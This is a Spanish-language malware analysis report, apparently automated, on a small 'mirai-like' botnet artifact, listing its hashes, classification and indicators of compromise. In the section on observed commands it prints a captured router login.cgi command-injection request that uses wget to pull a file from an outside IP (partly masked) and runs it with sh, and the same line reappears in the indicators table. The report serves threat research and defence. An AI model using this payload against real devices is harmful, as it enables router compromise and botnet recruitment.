# 🧬 Payload Analysis

`5aff41058326118b0bd97d48a51c5940a090b5ad0af0b909c0e96b7171c585b6`

## 📌 Resumen

Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai-like`
- **Confianza de familia:** `Media`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:07:07+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `5aff41058326118b0bd97d48a51c5940a090b5ad0af0b909c0e96b7171c585b6`
- **SHA1:** `6bab2040008b074f8c65536ac126d966b8bee60b`
- **MD5:** `5ac2ad4ee5a7d71977c9ff3ed22b603c`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 215 B |
| Entropía | 5.27 |
| Strings | 5 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /login.cgi?cli=aa%20aa%27;wget%20http://140.233.190.XXX/dlink%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1.1
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 140.233.190.XXX | static_analysis |
| url | hxxp://140.233.190.XXX/dlink%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ | strings |
| hash | 5aff41058326118b0bd97d48a51c5940a090b5ad0af0b909c0e96b7171c585b6 | static_analysis |
| command | GET /login.cgi?cli=aa%20aa%27;wget%20http://140.233.190.XXX/dlink%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1.1 | strings |
| ip | 143.44.213.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
